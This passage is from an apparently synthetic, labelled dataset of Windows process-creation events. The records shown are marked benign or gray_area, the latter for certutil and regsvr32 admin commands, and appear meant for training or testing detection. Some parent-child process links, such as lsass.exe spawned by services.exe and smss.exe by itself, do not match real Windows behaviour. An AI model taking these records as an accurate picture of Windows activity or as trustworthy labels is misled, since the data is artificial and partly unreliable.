    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 4318,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T12:35:37.691Z",
    "ProcessGuid": "{B4313C80-C367-40FA-9B34-A46E23540F6E}",
    "ProcessId": 7652,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -hashfile C:\\Users\\admin\\Downloads\\tool.exe MD5",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 17142,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T16:02:29.090Z",
    "ProcessGuid": "{7108099F-19C3-4FFC-B777-1183E75A8168}",
    "ProcessId": 21612,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 17541,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:17:32.552Z",
    "ProcessGuid": "{AD086D08-FBB1-46D1-B055-91105538F05B}",
    "ProcessId": 33361,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 29688,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T08:06:04.350Z",
    "ProcessGuid": "{7745D8E6-3587-4BE1-85B1-769387FF68B0}",
    "ProcessId": 12148,
    "Image": "C:\\Windows\\System32\\wuauclt.exe",
    "CommandLine": "wuauclt.exe /detectnow /updatenow",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 59191,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T09:07:47.055Z",
    "ProcessGuid": "{FBDC8111-6BB9-4AA2-8D5B-239643FF150D}",
    "ProcessId": 16928,
    "Image": "C:\\Program Files\\Git\\bin\\git.exe",
    "CommandLine": "git.exe pull origin main",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 63189,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T04:21:45.181Z",
    "ProcessGuid": "{2EE4D68F-64FD-4932-9ABE-7F864D278D00}",
    "ProcessId": 61213,
    "Image": "C:\\Windows\\SoftwareDistribution\\Download\\Install\\update.exe",
    "CommandLine": "update.exe /quiet /norestart",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 53587,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T15:32:58.873Z",
    "ProcessGuid": "{7B723A5C-BBC9-436D-9290-2988F6655B23}",
    "ProcessId": 35807,
    "Image": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe C:\\Users\\analyst01\\Documents",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 11317,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T07:01:33.489Z",
    "ProcessGuid": "{ECEFECD3-620E-47F1-9C5E-1E7C7DE9250F}",
    "ProcessId": 1044,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 22740,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T03:35:43.395Z",
    "ProcessGuid": "{77AEF3B3-F74C-418A-918F-CCDD649E16AA}",
    "ProcessId": 19621,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 17514,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T08:01:49.406Z",
    "ProcessGuid": "{6E1C6D6B-11FD-48DF-BABF-59579D3BDCD9}",
    "ProcessId": 35339,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 51134,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T23:44:18.130Z",
    "ProcessGuid": "{DF8C0C56-5AF5-4C1D-92C7-1C17E9907357}",
    "ProcessId": 12646,
    "Image": "C:\\Windows\\System32\\UsoClient.exe",
    "CommandLine": "UsoClient.exe StartInteractiveScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 48764,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T08:02:42.365Z",
    "ProcessGuid": "{F71469C4-EE41-4CED-92FF-CF55788AD02B}",
    "ProcessId": 57385,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 60983,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:32:29.574Z",
    "ProcessGuid": "{658E3730-758A-43A3-A806-448821E8572A}",
    "ProcessId": 61709,
    "Image": "C:\\Program Files\\Docker\\Docker\\resources\\bin\\docker.exe",
    "CommandLine": "docker.exe ps -a",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 47692,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T09:26:26.338Z",
    "ProcessGuid": "{8D04D153-5E98-4164-90A3-87B2EBB1A309}",
    "ProcessId": 36560,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 31534,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:02:55.074Z",
    "ProcessGuid": "{61B80997-E973-462C-AB63-984CE73B0C0B}",
    "ProcessId": 13331,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c gpupdate /force",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 53733,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T08:47:04.560Z",
    "ProcessGuid": "{78586EEF-AF69-4649-861B-19C04E81ADF0}",
    "ProcessId": 63383,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -dump C:\\Certs\\ca_cert.p7b",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 40471,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T19:56:27.160Z",
    "ProcessGuid": "{6D011AB9-4F72-403D-9F74-1B77ABB31093}",
    "ProcessId": 4509,
    "Image": "C:\\Windows\\System32\\UsoClient.exe",
    "CommandLine": "UsoClient.exe StartInteractiveScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 7636,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T16:18:01.514Z",
    "ProcessGuid": "{D482E590-C488-4E05-B255-EDE4E6FB9516}",
    "ProcessId": 54291,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ipconfig /all",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 46734,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T07:05:09.015Z",
    "ProcessGuid": "{97CA00BD-A615-49EC-802C-6A61332B1BFE}",
    "ProcessId": 33347,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 15233,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T14:05:48.432Z",
    "ProcessGuid": "{63904911-B6EB-4FF4-B011-8A822ED540CF}",
    "ProcessId": 54149,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -verifystore My server8",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 25132,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T13:46:50.321Z",
    "ProcessGuid": "{9B978AB7-F7DE-4A0C-8013-5DAA0198D9E8}",
    "ProcessId": 29599,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 40728,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:42:22.456Z",
    "ProcessGuid": "{3ACC9DAE-F856-4C86-A031-2E89D97A9721}",
    "ProcessId": 16751,
    "Image": "C:\\Windows\\System32\\resmon.exe",
    "CommandLine": "resmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 60277,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:49:59.904Z",
    "ProcessGuid": "{8FF4C5B0-68F1-4985-8A26-A536FFE8AF08}",
    "ProcessId": 59264,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c nslookup corp.local",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 2025,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:28:28.982Z",
    "ProcessGuid": "{58050888-72CF-49DC-9DEB-614A2F83E655}",
    "ProcessId": 27023,
    "Image": "C:\\Windows\\System32\\dwm.exe",
    "CommandLine": "dwm.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 1012,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:41:00.999Z",
    "ProcessGuid": "{8DFEE48F-4EB1-4C4F-8656-FA0EB3491725}",
    "ProcessId": 11318,
    "Image": "C:\\Windows\\System32\\odbcad32.exe",
    "CommandLine": "odbcad32.exe",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentProcessId": 6691,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T21:23:40.912Z",
    "ProcessGuid": "{7B1DBCED-D4EE-45F0-B58C-61CDD908439E}",
    "ProcessId": 55310,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 31129,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T11:46:23.972Z",
    "ProcessGuid": "{46391331-B534-4F71-BED9-F3CC308FBE78}",
    "ProcessId": 1922,
    "Image": "C:\\Users\\sysadmin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 59458,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:58:35.120Z",
    "ProcessGuid": "{78283B2B-2FE9-4F42-AEE4-488B558B8F7C}",
    "ProcessId": 18155,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 51788,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:28:28.691Z",
    "ProcessGuid": "{56C7D102-5F23-47A3-877A-16D1DEFF1347}",
    "ProcessId": 15005,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 34500,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T15:21:22.131Z",
    "ProcessGuid": "{0F9F69E1-1425-4B15-8071-D6743144E9F8}",
    "ProcessId": 44994,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe compmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 43957,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T19:47:28.564Z",
    "ProcessGuid": "{94C871D8-1C62-4E02-AF24-1826ED15B471}",
    "ProcessId": 47246,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --no-first-run",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 29028,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T13:41:06.693Z",
    "ProcessGuid": "{91388240-180B-49FA-8C45-330CEC51FD9A}",
    "ProcessId": 53432,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Test-Connection -ComputerName fileserver -Count 4\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 11771,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:50:43.370Z",
    "ProcessGuid": "{185A5564-A3AB-447A-B5F2-9DFB1DB99832}",
    "ProcessId": 62848,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s C:\\Program Files\\Common Files\\System\\Ole DB\\oledb32.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 2950,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T09:13:34.848Z",
    "ProcessGuid": "{00B962B2-CE48-4FCA-AA68-2C49ED8EDE26}",
    "ProcessId": 47054,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe compmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 58582,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:04:05.346Z",
    "ProcessGuid": "{C7D4C0D8-86A1-471D-96DD-A0C343640F4A}",
    "ProcessId": 21631,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s C:\\Program Files\\Common Files\\System\\Ole DB\\oledb32.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 27322,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T13:42:06.878Z",
    "ProcessGuid": "{57F5F1A2-0B35-4790-B438-7C7C23B0ED33}",
    "ProcessId": 11539,
    "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "CommandLine": "firefox.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 22614,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T18:32:15.285Z",
    "ProcessGuid": "{8071C512-4BC0-476B-B202-B912717D4677}",
    "ProcessId": 44842,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 32812,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T01:29:22.159Z",
    "ProcessGuid": "{4F01935A-662C-465A-A7E3-5C23F142D820}",
    "ProcessId": 10070,
    "Image": "C:\\Windows\\System32\\smss.exe",
    "CommandLine": "smss.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 18366,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T16:42:40.634Z",
    "ProcessGuid": "{827C951F-19D1-4297-9A7F-82D23A1B391C}",
    "ProcessId": 22966,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 7120,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
